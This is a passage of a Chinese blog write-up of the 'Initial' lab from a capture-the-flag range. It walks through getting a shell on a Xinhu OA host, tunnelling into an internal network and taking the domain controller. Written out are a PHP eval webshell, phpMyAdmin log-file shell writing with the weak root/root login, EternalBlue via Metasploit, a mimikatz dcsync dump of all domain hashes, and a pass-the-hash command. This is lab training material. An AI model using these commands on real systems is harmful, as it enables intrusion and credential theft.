+<h4 id="踩坑三"><a href="#踩坑三" class="headerlink" title="踩坑三"></a>踩坑三</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我一开始写的一句话木马是</span><br><span class="line">&lt;?php @eval($_POST[8]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713150735800.png" alt="image-20240713150735800"></p>
+<p>但是 好像不解析 连接失败</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">8</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713150947040.png" alt="image-20240713150947040"></p>
+<p>蚁剑设置代理即可成功连接</p>
+<h4 id="踩坑四"><a href="#踩坑四" class="headerlink" title="踩坑四"></a>踩坑四</h4><p>proxychains代理设置socks5<br>我没有把socks4删掉<br>故是走socks4代理 使得exp没有发包成功</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713152544591.png" alt="image-20240713152544591"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713152720983.png" alt="image-20240713152720983"></p>
+<p>删除 再添加 即可 走socks5 从而连接进内网 进行发包</p>
+<h3 id="信呼OA方法二"><a href="#信呼OA方法二" class="headerlink" title="信呼OA方法二"></a>信呼OA方法二</h3><blockquote>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/democtfer/p/18262627/spring-and-autumn-cloud-mirror-initial-zwd5ss">春秋云镜 Initial - DemoCTFer - 博客园 (cnblogs.com)</a></p>
+</blockquote>
+<blockquote>
+<p>由于flag03处没有理解透彻 想回顾复盘一下 结果frp处代理又卡了挺久<br>参考大佬wp 看到了 phpmyadmin 日志getshell  并尝试着getshell</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816021632373.png" alt="image-20240816021632373"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816022213624.png" alt="image-20240816022213624"></p>
+<p>存在弱口令root&#x2F;root</p>
+<p>第一步执行<code>show variables like &#39;general%&#39;;</code>查看是否开启日志以及存放的日志位置</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816022340115.png" alt="image-20240816022340115"></p>
+<p>第二步<code>set global general_log = ON;</code>开启日志</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816022518806.png" alt="image-20240816022518806"></p>
+<p>第三步<code>set global general_log_file</code>设置日志保存位置</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816023011618.png" alt="image-20240816023011618"></p>
+<h4 id="踩坑五"><a href="#踩坑五" class="headerlink" title="踩坑五"></a>踩坑五</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">路径最好写成</span><br><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\PHPTutorial\\www\\webshell.php&#x27;;</span><br><span class="line">因为 \ 容易转义字符</span><br><span class="line">set global general_log_file=&#x27;C:\phpStudy\PHPTutorial\www\webshell.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816024650303.png" alt="image-20240816024650303"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\ 转义了字符 故\\防止转义</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816024907973.png" alt="image-20240816024907973"></p>
+<p>第四步写入webshell</p>
+<p><code>SELECT &#39;&lt;?php @eval($_POST[8]);?&gt;&#39;；</code></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816023130833.png" alt="image-20240816023130833"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816024343096.png" alt="image-20240816024343096"></p>
+<p>成功getshell</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816025216275.png" alt="image-20240816025216275"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816025439687-1723748544811-11.png" alt="image-20240816025439687"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看phpmyadmin rockxinhu数据库 xinhu_admin 可以查到用户名以及密码</span><br><span class="line">从而亦可得到admin admin123</span><br></pre></td></tr></table></figure>
+
+<p>方法一、方法二都可getshell  后面皆是蚁剑设置代理连接寻找flag02</p>
+<h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><p>flag在C:&#x2F;Users&#x2F;Administrator&#x2F;flag&#x2F;flag02.txt</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713140520346.png" alt="image-20240713140520346"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag02: 2ce3-4813-87d4-</span><br><span class="line">Awesome! ! ! You found the second flag, now you can attack the domain controller.</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit  # 导出域内所有用户的信息(包括哈希值)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713142814653.png" alt="image-20240713142814653"></p>
+<h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713143047772.png" alt="image-20240713143047772"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag03: e8f88d0d43d6&#125;</span><br><span class="line">Unbelievable! ! You found the last flag, which means you have full control over the ent</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/links/">Links</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%A0%87%E4%BB%8B%E7%BB%8D%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">靶标介绍：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fscan%E6%8E%A2%E9%92%88"><span class="toc-number">2.</span> <span class="toc-text">fscan探针</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tp5-0-23"><span class="toc-number">2.1.</span> <span class="toc-text">tp5.0.23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag01"><span class="toc-number">2.2.</span> <span class="toc-text">flag01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.3.</span> <span class="toc-text">内网探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E4%B8%80"><span class="toc-number">2.3.1.</span> <span class="toc-text">踩坑一</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">内网隧道搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Neo-reGeorg"><span class="toc-number">3.1.</span> <span class="toc-text">Neo-reGeorg</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E4%BA%8C"><span class="toc-number">3.1.1.</span> <span class="toc-text">踩坑二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#frp"><span class="toc-number">3.2.</span> <span class="toc-text">frp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#frps-ini"><span class="toc-number">3.2.1.</span> <span class="toc-text">frps.ini</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#frpc-ini"><span class="toc-number">3.2.2.</span> <span class="toc-text">frpc.ini</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E5%91%BCOA%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">3.3.</span> <span class="toc-text">信呼OA方法一</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E4%B8%89"><span class="toc-number">3.3.1.</span> <span class="toc-text">踩坑三</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E5%9B%9B"><span class="toc-number">3.3.2.</span> <span class="toc-text">踩坑四</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E5%91%BCOA%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">3.4.</span> <span class="toc-text">信呼OA方法二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E4%BA%94"><span class="toc-number">3.4.1.</span> <span class="toc-text">踩坑五</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag02"><span class="toc-number">3.5.</span> <span class="toc-text">flag02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag03"><span class="toc-number">3.6.</span> <span class="toc-text">flag03</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://liangmosec.github.io/2024/07/13/Initial/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://liangmosec.github.io/2024/07/13/Initial/&text=Initial"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://liangmosec.github.io/2024/07/13/Initial/&title=Initial"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://liangmosec.github.io/2024/07/13/Initial/&is_video=false&description=Initial"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Initial&body=Check out this article: https://liangmosec.github.io/2024/07/13/Initial/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://liangmosec.github.io/2024/07/13/Initial/&title=Initial"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://liangmosec.github.io/2024/07/13/Initial/&title=Initial"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://liangmosec.github.io/2024/07/13/Initial/&title=Initial"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://liangmosec.github.io/2024/07/13/Initial/&title=Initial"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://liangmosec.github.io/2024/07/13/Initial/&name=Initial&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://liangmosec.github.io/2024/07/13/Initial/&t=Initial"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    凉墨
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
